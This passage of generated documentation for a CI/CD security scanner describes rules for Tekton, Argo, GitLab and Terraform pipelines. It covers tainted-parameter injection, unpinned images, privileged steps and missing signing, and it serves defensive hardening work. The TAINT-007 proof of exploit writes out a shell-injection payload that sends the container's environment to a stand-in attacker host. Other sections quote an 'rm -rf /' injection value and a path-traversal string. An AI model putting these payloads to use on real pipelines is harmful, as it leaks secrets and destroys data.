**Source:** [`TAINT-005`](../providers/buildkite.md#taint-005) in the [Buildkite provider](../providers/buildkite.md).

### `TAINT-006`: Untrusted input flows across tasks via Tekton ``results`` <span class="pg-sev pg-sev--high">HIGH</span> { #detail-taint-006 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** Detection walks every ``Pipeline`` document. Pass 1 looks for tasks whose body's ``steps[*].script`` writes to ``$(results.<X>.path)`` AND interpolates a ``$(params.<Y>)`` reference, recording ``X`` as a tainted result for that producer task. Pass 2 walks every task for ``params:`` whose ``value:`` is ``$(tasks.<producer>.results.<X>)``. When ``(producer, X)`` matches a tainted result and the consumer's body's ``steps[*].script`` references ``$(params.<consumer-name>)`` (where consumer-name is the param the result was forwarded into), TAINT-006 fires.

Body resolution: inline ``taskSpec:`` blocks are walked directly; ``taskRef: { name: <X> }`` references resolve against ``Task`` / ``ClusterTask`` documents loaded into the same scan, so a Pipeline that splits the producer / consumer task definitions into separate files still trips the rule. ``bundle:`` and ``resolver:`` (remote OCI / Tekton-resolver-framework references) aren't followed; they require network fetches the scanner deliberately avoids. ``finally:`` blocks aren't walked yet.

**Recommendation.** Sanitise the value at the producer task before it lands in ``$(results.<name>.path)``. The canonical safe pattern is to copy the ``$(params.<name>)`` source into an intermediate shell variable, run a sanitiser (``tr -dc 'a-zA-Z0-9 '`` for a freeform title), and only then write the cleaned value to the result file. The consumer task should still treat its own param as tainted: surface ``$(params.<name>)`` into a quoted shell variable (``TITLE="$(params.title)"``) before interpolating elsewhere. Removing the cross-task results forwarding is the strongest fix; if the value genuinely needs to flow downstream, validate the sanitiser is doing what you think before relying on it.

**Known false positives.**

- If the producer task runs a sanitiser between the tainted ``$(params.X)`` interpolation and the ``$(results.Y.path)`` write, the consumer is no longer exploitable but TAINT-006 still fires. Suppress via ignore-file scoped to the consumer task name when this is the deliberate shape; the sanitiser is then load-bearing.

**Source:** [`TAINT-006`](../providers/tekton.md#taint-006) in the [Tekton provider](../providers/tekton.md).

### `TAINT-007`: Untrusted input flows across templates via Argo ``outputs.parameters`` <span class="pg-sev pg-sev--high">HIGH</span> { #detail-taint-007 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** Detection walks every workflow document with ``spec.templates``. Pass 1 looks for templates that declare ``outputs.parameters`` AND whose inline ``script.source`` interpolates ``{{inputs.parameters.<X>}}``, recording the template's outputs as tainted. Pass 2 walks each template's DAG / Steps orchestrator for tasks whose ``arguments.parameters[*].value`` is ``{{tasks.<producer>.outputs.parameters.<X>}}`` matching a recorded leak. Pass 3 walks the consumer task's referenced template for the matching ``{{inputs.parameters.<consumer-param>}}`` reference in its script body and emits one path per match.

v1 limitations: ``workflowTemplateRef:`` cross-document references aren't resolved (would need the same machinery as the GHA ``--resolve-remote`` flow). ``onExit:`` exit handlers aren't yet walked.

**Recommendation.** Sanitise the value at the producer template before it lands in an output parameter. The canonical safe pattern is to surface ``{{inputs.parameters.<X>}}`` into a quoted shell variable, run a sanitiser (``tr -dc 'a-zA-Z0-9 '`` for a freeform title), and only then redirect the cleaned value to the output path. The consumer template should still reference ``{{inputs.parameters.<name>}}`` quoted (``"{{inputs.parameters.title}}"``) and never inline into a command without re-quoting. Removing the cross-template forwarding is the strongest fix; if the value genuinely needs to flow downstream, validate the sanitiser is doing what you think before relying on it.

**Known false positives.**

- If the producer template runs a sanitiser between the tainted ``{{inputs.parameters.X}}`` interpolation and the output-path write, the consumer is no longer exploitable but TAINT-007 still fires. Suppress via ignore-file scoped to the consumer template name when this is the deliberate shape; the sanitiser is then load-bearing.

**Proof of exploit.**

```
# Vulnerable: producer template hands a tainted parameter
# through outputs.parameters; consumer interpolates it into
# its own shell.
apiVersion: argoproj.io/v1alpha1
kind: Workflow
metadata: { generateName: ci- }
spec:
  entrypoint: main
  arguments: { parameters: [ { name: title } ] }
  templates:
    - name: main
      dag:
        tasks:
          - name: produce
            template: read-title
            arguments:
              parameters:
                - name: title
                  value: '{{workflow.parameters.title}}'
          - name: consume
            template: ship
            dependencies: [produce]
            arguments:
              parameters:
                - name: clean_title
                  value: '{{tasks.produce.outputs.parameters.title}}'
    - name: read-title
      inputs: { parameters: [ { name: title } ] }
      outputs:
        parameters:
          - name: title
            valueFrom: { path: /tmp/title.txt }
      script:
        image: alpine:3.20
        command: [sh]
        # BUG: tainted input written to output path unchanged.
        source: echo '{{inputs.parameters.title}}' > /tmp/title.txt
    - name: ship
      inputs: { parameters: [ { name: clean_title } ] }
      script:
        image: alpine:3.20
        command: [sh]
        # BUG: re-interpolation into shell.
        source: |
          curl https://api/announce --data-urlencode \
            "title={{inputs.parameters.clean_title}}"

# Attack: caller submits the workflow with a parameter that
# carries shell:
#
#   argo submit wf.yml \
#     -p title='ok";curl attacker/x -d "$(env|base64)";echo "'
#
# ``read-title`` writes the tainted bytes verbatim to
# /tmp/title.txt; Argo hands them through ``outputs.
# parameters.title`` into the consumer's ``clean_title``
# input; the consumer's ``source:`` interpolates them back
# into the shell. The container's ServiceAccount carries
# whatever privilege you've granted the workflow.

# Safe: sanitise in the producer before writing the output,
# and keep the consumer's reference quoted as an extra belt.
    - name: read-title
      inputs: { parameters: [ { name: title } ] }
      outputs:
        parameters:
          - name: title
            valueFrom: { path: /tmp/title.txt }
      script:
        image: alpine:3.20
        command: [sh]
        env:
          - name: RAW
            value: '{{inputs.parameters.title}}'
        source: printf '%s' "$RAW" | tr -dc 'a-zA-Z0-9 ' > /tmp/title.txt
```

**Source:** [`TAINT-007`](../providers/argo.md#taint-007) in the [Argo Workflows provider](../providers/argo.md).

### `TAINT-008`: Untrusted input flows via GitLab ``extends:`` template inheritance <span class="pg-sev pg-sev--high">HIGH</span> { #detail-taint-008 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** Two-pass walk over the pipeline doc. Pass 1 builds a universe of every job-shaped entry (hidden templates included, top-level keywords excluded), resolves each non-hidden job's ``extends:`` chain transitively, and gathers tainted variables (any ``$CI_COMMIT_*`` / ``$CI_MERGE_REQUEST_*`` interpolation in the link's ``variables:`` block). Pass 2 walks the consuming job's ``before_script:`` / ``script:`` / ``after_script:`` for unquoted ``$<name>`` references matching an inherited tainted variable. Cycles in the extends chain are broken via a visited set; unresolvable extends entries are silently dropped.

v1 limitations: ``include:`` cross-pipeline file inclusion isn't tracked yet (would need cross-document analysis like the GHA ``--resolve-remote`` flow). ``extends:`` chains that pull templates from include-d files are partial: in-doc links resolve, external links are treated as missing.

**Recommendation.** Move the tainted-source interpolation out of the template's ``variables:`` block. The canonical safe pattern is to receive the source value through ``$CI_*`` directly in the consuming job's script (or a dedicated sanitiser step) and never copy it into a shared variable a downstream job can interpolate unquoted. If the inheritance is genuinely needed, sanitise at the boundary (``TITLE_SAFE: '$(echo "$CI_COMMIT_TITLE" | tr -dc "a-zA-Z0-9 ")'``) and have the extending job reference the cleaned variable. Removing the ``extends:`` propagation is the strongest fix; if the value genuinely needs to flow downstream, validate the sanitiser is doing what you think before relying on it.

**Known false positives.**

- If the consuming job sanitises the inherited variable before referencing it (``CLEAN=$(echo "$TITLE" | tr -dc 'a-zA-Z0-9 '); echo $CLEAN``), the rule still fires on the original ``$TITLE`` reference even though the sanitised value is what reaches the shell. Suppress via ignore-file scoped to the consuming job's name when the sanitiser is audited and load-bearing.

**Source:** [`TAINT-008`](../providers/gitlab.md#taint-008) in the [GitLab CI provider](../providers/gitlab.md).

### `TF-001`: aws_iam_access_key declares a long-lived access key <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-tf-001 }

**Evidences:** [`ESF-D-TOKEN-HYGIENE`](#ctrl-esf-d-token-hygiene) Use short-lived, federated credentials (OIDC), not long-lived tokens.

**How this is detected.** See [`Terraform` provider documentation](../providers/terraform.md) for the rule's detection mechanism.

**Recommendation.** See [`Terraform` provider documentation](../providers/terraform.md) for the recommended remediation.

**Source:** [`TF-001`](../providers/terraform.md) in the [Terraform provider](../providers/terraform.md).

### `TF-002`: Resource attribute carries a hard-coded secret shape <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-tf-002 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** See [`Terraform` provider documentation](../providers/terraform.md) for the rule's detection mechanism.

**Recommendation.** See [`Terraform` provider documentation](../providers/terraform.md) for the recommended remediation.

**Source:** [`TF-002`](../providers/terraform.md) in the [Terraform provider](../providers/terraform.md).

### `TF-003`: CodeBuild VPC shares its VPC with a public subnet <span class="pg-sev pg-sev--high">HIGH</span> { #detail-tf-003 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** See [`Terraform` provider documentation](../providers/terraform.md) for the rule's detection mechanism.

**Recommendation.** See [`Terraform` provider documentation](../providers/terraform.md) for the recommended remediation.

**Source:** [`TF-003`](../providers/terraform.md) in the [Terraform provider](../providers/terraform.md).

### `TKN-001`: Tekton step image not pinned to a digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-tkn-001 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests, [`ESF-S-IMMUTABLE`](#ctrl-esf-s-immutable) Enforce artifact / tag immutability to preserve provenance.

**How this is detected.** Applies to ``Task`` and ``ClusterTask`` kinds. The image must contain ``@sha256:`` followed by a 64-char hex digest. Any tag-only reference, including ``:latest``, fails.

**Recommendation.** Pin every step image to a content-addressable digest (``gcr.io/tekton-releases/git-init@sha256:<digest>``). Tag-only references (``alpine:3.18``) and rolling tags (``alpine:latest``) let a compromised registry update redirect the step at the next pull, with no audit trail in the Task manifest.

**Source:** [`TKN-001`](../providers/tekton.md#tkn-001) in the [Tekton provider](../providers/tekton.md).

### `TKN-002`: Tekton step runs privileged or as root <span class="pg-sev pg-sev--high">HIGH</span> { #detail-tkn-002 }

**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** Detection fires on a step with ``securityContext.privileged: true``, ``securityContext.runAsUser: 0``, ``securityContext.runAsNonRoot: false``, ``securityContext.allowPrivilegeEscalation: true``, or no ``securityContext`` block at all.

**Recommendation.** Set ``securityContext.privileged: false``, ``runAsNonRoot: true``, and ``allowPrivilegeEscalation: false`` on every step. A privileged step shares the node's kernel namespaces; a malicious or compromised step image then has root on the build node, breaking the boundary between build and cluster.

**Source:** [`TKN-002`](../providers/tekton.md#tkn-002) in the [Tekton provider](../providers/tekton.md).

### `TKN-003`: Tekton param interpolated unsafely in step script <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-tkn-003 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** Fires on any ``$(params.X)`` or ``$(workspaces.X.path)`` token inside a ``script:`` body that isn't already wrapped in double quotes (`"$(params.X)"`). Doesn't fire on the env-var indirection pattern, which is safe.

**Recommendation.** Don't interpolate ``$(params.<name>)`` directly into the step ``script:``. Tekton substitutes the value before the shell parses it, so a parameter containing ``; rm -rf /`` runs as shell. Receive the parameter through ``env:`` (``valueFrom: ...`` or ``value: $(params.<name>)``) and reference the env var quoted in the script (``"$NAME"``); or pass it as a positional argument to a shell function.

**Source:** [`TKN-003`](../providers/tekton.md#tkn-003) in the [Tekton provider](../providers/tekton.md).

### `TKN-004`: Tekton Task mounts hostPath or shares host namespaces <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-tkn-004 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers), [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** Checks ``spec.volumes[].hostPath`` (legacy v1beta1 form), ``spec.workspaces[].volumeClaimTemplate.spec.storageClassName == 'hostpath'``, and ``spec.podTemplate`` host-namespace flags.

**Recommendation.** Use Tekton ``workspaces:`` backed by ``emptyDir`` or ``persistentVolumeClaim`` instead of ``hostPath``. Drop ``hostNetwork: true`` / ``hostPID: true`` / ``hostIPC: true`` on the Task's ``podTemplate``. A hostPath mount of ``/var/run/docker.sock`` or ``/`` lets the build break out of the pod and act as the underlying node.

**Source:** [`TKN-004`](../providers/tekton.md#tkn-004) in the [Tekton provider](../providers/tekton.md).

### `TKN-005`: Literal secret value in Tekton step env or param default <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-tkn-005 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Strong matches: AWS access keys, GitHub PATs, JWTs. Weak match: env var name suggests a secret (``*_TOKEN``, ``*_KEY``, ``*PASSWORD``, ``*SECRET``) and the value is a non-empty literal rather than a ``$(params.X)`` / ``valueFrom`` reference.

**Recommendation.** Mount secrets via ``env.valueFrom.secretKeyRef`` (or a ``volumes:`` Secret mount) instead of writing the value into ``env.value`` or ``params[].default``. Task manifests are committed to git and cluster-readable; literal values leak through normal access paths.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`TKN-005`](../providers/tekton.md#tkn-005) in the [Tekton provider](../providers/tekton.md).

### `TKN-006`: Tekton run lacks an explicit timeout <span class="pg-sev pg-sev--low">LOW</span> { #detail-tkn-006 }

**Evidences:** [`ESF-D-BUILD-TIMEOUT`](#ctrl-esf-d-build-timeout) Enforce bounded build execution (single-use, time-limited).

**How this is detected.** Applies to ``PipelineRun``, ``TaskRun``, and ``Pipeline``. For Pipelines, the rule looks for ``spec.tasks[].timeout`` as evidence of intent. ``Task`` / ``ClusterTask`` themselves don't carry a timeout, the timeout lives on the concrete run.

**Recommendation.** Set ``spec.timeouts.pipeline`` (or ``spec.timeout`` on a TaskRun) on every PipelineRun and TaskRun. A misbehaving step otherwise pins a build pod for the cluster's default timeout (1h). For long jobs, set a generous explicit value (``2h``, ``6h``) rather than leaving it implicit.

**Source:** [`TKN-006`](../providers/tekton.md#tkn-006) in the [Tekton provider](../providers/tekton.md).

### `TKN-007`: Tekton run uses the default ServiceAccount <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-tkn-007 }

**Evidences:** [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** An explicit ``serviceAccountName: default`` setting is treated the same as omission.

**Recommendation.** Set ``spec.serviceAccountName`` on every ``TaskRun`` and ``PipelineRun`` to a least-privilege ServiceAccount that carries only the secrets and RBAC the run actually needs. Falling back to the namespace's ``default`` SA grants access to whatever cluster-admin or wildcard role someone later binds to ``default``, a privilege-escalation surface that should never be load-bearing for build pods.

**Source:** [`TKN-007`](../providers/tekton.md#tkn-007) in the [Tekton provider](../providers/tekton.md).

### `TKN-008`: Tekton step script pipes remote install or disables TLS <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-tkn-008 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-TRUSTED-REG`](#ctrl-esf-s-trusted-reg) Use only trusted, authenticated package and image registries.

**How this is detected.** Uses the cross-provider ``_primitives.remote_script_exec`` and ``_primitives.tls_bypass`` detectors so detection is consistent with the GHA / GitLab / CircleCI / Cloud Build providers (covering helm / kubectl / ssh / docker / maven / gradle / aws bypasses in addition to the curl / wget / git / npm / pip baseline).

**Recommendation.** Replace ``curl ... | sh`` with a download-then-verify-then-execute pattern. Drop TLS-bypass flags (``curl -k``, ``git config http.sslverify false``); install the missing CA into the step image instead. Both forms let an attacker controlling DNS / a transparent proxy substitute the script the step runs.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Tasks running entirely against an internal mirror (``curl https://internal-mirror/install.sh | sh`` where the mirror is the same supply chain as the task image itself) carry less marginal risk than a public-internet fetch, but the rule still fires because the curl-pipe primitive is the structural signal. ``curl -k`` to a TLS endpoint with a known self-signed CA likewise triggers; the canonical fix is to install the CA into the step image and drop ``-k``, but per-task suppression via ``--ignore-file`` is the escape hatch.

**Source:** [`TKN-008`](../providers/tekton.md#tkn-008) in the [Tekton provider](../providers/tekton.md).

### `TKN-009`: Artifacts not signed (no cosign/sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-tkn-009 }

**Evidences:** [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) Sign build artifacts and verify signatures before release.

**How this is detected.** Detection mirrors GHA-006 / BK-009 / CC-006, the shared signing-token catalog (cosign, sigstore, slsa-github-generator, slsa-framework, notation-sign) is searched across every string in the Task / Pipeline document. The rule only fires on artifact-producing Tasks (those that invoke ``docker build`` / ``docker push`` / ``buildah`` / ``kaniko`` / ``helm upgrade`` / ``aws s3 sync`` / etc.) so lint-only Tasks don't trip it.

**Recommendation.** Add a signing step to the Task, either a dedicated ``cosign sign`` step after the build, or use the official ``cosign`` Tekton catalog Task as a referenced step. The Task should sign by digest (``cosign sign --yes <repo>@sha256:<digest>``) so a re-pushed tag can't bypass the signature.

**Source:** [`TKN-009`](../providers/tekton.md#tkn-009) in the [Tekton provider](../providers/tekton.md).

### `TKN-010`: No SBOM generated for build artifacts <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-tkn-010 }

**Evidences:** [`ESF-D-SBOM`](#ctrl-esf-d-sbom) Produce SBOM / provenance metadata with every build.

**How this is detected.** An SBOM (CycloneDX or SPDX) records every component baked into the build. Without one, post-incident triage can't answer ``did this CVE ship?`` for a given artifact. Detection uses the shared SBOM-token catalog: syft, cyclonedx, cdxgen, spdx-tools, microsoft/sbom-tool. Fires only on artifact-producing Tasks.

**Recommendation.** Add an SBOM-generation step. ``syft <artifact> -o cyclonedx-json > $(workspaces.output.path)/sbom.json`` runs in the official ``syft`` Tekton catalog Task. ``cyclonedx-cli`` and ``cdxgen`` are alternatives. Publish the SBOM as a Workspace result so downstream Tasks can consume it.

**Source:** [`TKN-010`](../providers/tekton.md#tkn-010) in the [Tekton provider](../providers/tekton.md).

### `TKN-011`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-tkn-011 }

**Evidences:** [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) Sign build artifacts and verify signatures before release, [`ESF-S-PROVENANCE`](#ctrl-esf-s-provenance) Generate and verify provenance metadata (SLSA / in-toto) for produced artifacts.

**How this is detected.** Provenance generation is distinct from signing. A signed artifact proves *who* published it; a provenance attestation proves *where / how* it was built. Tekton Chains is the Tekton-native answer, once enabled on the cluster, every TaskRun's outputs are signed and attested without per-Task wiring. Detection uses the shared provenance-token catalog (``slsa-framework``, ``cosign attest``, ``in-toto``, ``attest-build-provenance``, ``witness run``). Tasks produced by tekton-chains pass on the ``cosign attest`` match.

**Recommendation.** After the build step, run ``cosign attest --predicate slsa.json --type slsaprovenance <ref>`` (or use the ``tekton-chains`` controller, which signs and attests every TaskRun automatically when configured). Publish the attestation alongside the artifact so consumers can verify *how* it was built, not just *who* signed it.

**Source:** [`TKN-011`](../providers/tekton.md#tkn-011) in the [Tekton provider](../providers/tekton.md).

### `TKN-012`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-tkn-012 }

**Evidences:** [`ESF-S-VULN-MGMT`](#ctrl-esf-s-vuln-mgmt) Scan inbound artifacts (images, packages) for known vulnerabilities.

**How this is detected.** Vulnerability scanning sits at a different layer from signing and SBOM. It answers *does this artifact ship a known CVE?* rather than *can we verify what it is?*. Detection uses the shared vuln-scan-token catalog: trivy, grype, snyk, npm-audit, pip-audit, osv-scanner, govulncheck, anchore, codeql-action, semgrep, bandit, checkov, tfsec, dependency-check. Walks every Task / Pipeline / *Run document; passes if any document includes a scanner reference.

**Recommendation.** Add a vulnerability scanner step. ``trivy fs $(workspaces.src.path)`` for source / filesystem; ``trivy image <ref>`` for container images. The official Tekton catalog ships ``trivy-scanner`` and ``grype-scanner`` Tasks if you'd rather reference one. Fail the step on findings above a chosen severity so a regression blocks the merge instead of shipping.

**Source:** [`TKN-012`](../providers/tekton.md#tkn-012) in the [Tekton provider](../providers/tekton.md).

### `TKN-013`: Tekton sidecar runs privileged or as root <span class="pg-sev pg-sev--high">HIGH</span> { #detail-tkn-013 }

**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** TKN-002 hardens the ``spec.steps`` list. Tekton's ``spec.sidecars`` list runs alongside the steps in the same pod, but a sidecar's container image and command come from a separate place in the manifest, so a Task with hardened steps and a privileged sidecar (a common pattern when wrapping ``docker:dind``) leaves the same kernel-namespace gap TKN-002 was meant to close. The detection mirrors TKN-002: fires on a sidecar with ``securityContext.privileged: true``, ``runAsUser: 0``, ``runAsNonRoot: false``, ``allowPrivilegeEscalation: true``, or no ``securityContext`` block at all.

**Recommendation.** Set ``securityContext.privileged: false``, ``runAsNonRoot: true``, and ``allowPrivilegeEscalation: false`` on every sidecar in ``spec.sidecars``. A privileged sidecar is the same escape vector as a privileged step, it shares the pod's network and kernel namespaces, and a compromised sidecar image owns the entire TaskRun's execution surface.

**Known false positives.**

- Tasks that genuinely need ``docker:dind`` as a sidecar, e.g. building images inside the cluster without giving the step itself host-Docker access. The replacement pattern is Kaniko or BuildKit running as the step itself, with no privileged sidecar; if neither is viable, ignore TKN-013 in ``.pipeline-check-ignore.yml`` for the affected Task.

**Source:** [`TKN-013`](../providers/tekton.md#tkn-013) in the [Tekton provider](../providers/tekton.md).

### `TKN-014`: Tekton step script runs unpinned package install <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-tkn-014 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Detection reuses the cross-provider primitives ``PKG_INSECURE_RE`` and ``PKG_NO_LOCKFILE_RE`` from ``checks/base.py``. Same rule pack already exists for GHA (``GHA-021`` / ``GHA-022``), GitLab (``GL-021`` / ``GL-022``), Bitbucket / Azure DevOps / Jenkins / CircleCI / Cloud Build / Buildkite / Drone. Tekton was a gap; this closes it. Only ``Task`` and ``ClusterTask`` documents are scanned because that's where Tekton step scripts live.

**Recommendation.** Pin every package install to a lockfile or a checksum-verified version. ``npm ci`` (not ``npm install``), ``yarn install --frozen-lockfile``, ``pip install -r requirements.txt --require-hashes``, ``bundle install --frozen``. Don't use ``--trusted-host`` / ``--no-verify`` / a non-HTTPS index URL — those bypass TLS or trust validation entirely (TKN-008 covers the TLS subset; this rule covers the lockfile subset).

**Known false positives.**

- Bootstrap-stage installs that intentionally pull latest (``apt-get install -y curl`` for a tooling image rebuild) sometimes legitimately bypass the lockfile. Suppress via ignore-file scoped to the specific step name.

**Source:** [`TKN-014`](../providers/tekton.md#tkn-014) in the [Tekton provider](../providers/tekton.md).

### `TKN-015`: Workspace subPath interpolates a Task parameter (path traversal) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-tkn-015 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** Tekton's ``$(params.x)`` substitution is performed on every string field of the resolved ``TaskRun`` body, including a step-level workspace binding's ``subPath``. TKN-003 catches the same parameter being interpolated into a step's script body; TKN-015 catches the complementary file-system breakout vector that script-only detection misses, the value never appears in a shell command, only in the volume-mount config.

The detection scans the step-level ``workspaces:`` list (``spec.steps[*].workspaces[*].subPath``) for any ``$(params.<name>)`` reference. ``$(workspaces.x.path)`` expansions are unaffected because those are not pusher-controlled.

**Recommendation.** Pin every workspace ``subPath:`` to a static literal that your team controls. ``subPath: build/output`` is fine; ``subPath: $(params.target_dir)`` is not, because a parameter-driven sub-path lets an attacker break out of the workspace and write into a sibling directory of the shared volume. Tekton resolves ``$(params.x)`` substitution in workspace bindings before the volume mount happens, so ``../../../etc`` lands as a real path. If you genuinely need a runtime-chosen sub-path, sanitise the parameter with a step-level pre-check (``case`` against an allow-list, reject anything containing ``..``) and pass the validated value through a result rather than the raw parameter.

**Known false positives.**

- Some teams use a parameter to select between a small set of allowed sub-paths and rely on a step pre-check to reject anything off-list. The rule has no way to see that pre-check; suppress on the specific step name when this is the deliberate shape.

**Source:** [`TKN-015`](../providers/tekton.md#tkn-015) in the [Tekton provider](../providers/tekton.md).

## Mapped check IDs not found in the rule registry

The standards data references check IDs the scanner does not ship. The mapping is preserved for forward-compat; once the rule lands the row will fill in automatically.

- `NPM-001`
- `NPM-002`
- `NPM-003`
- `NPM-004`
- `NPM-005`
- `NPM-006`
- `NPM-007`
- `NPM-011`
- `PYPI-001`
- `PYPI-002`
- `PYPI-003`
- `PYPI-004`
- `PYPI-005`
- `PYPI-006`

---

_This page is generated. Edit `pipeline_check/core/standards/data/esf_supply_chain.py` (mappings) or `scripts/gen_standards_docs.py` (intro / per-control prose) and run `python scripts/gen_standards_docs.py esf_supply_chain`._
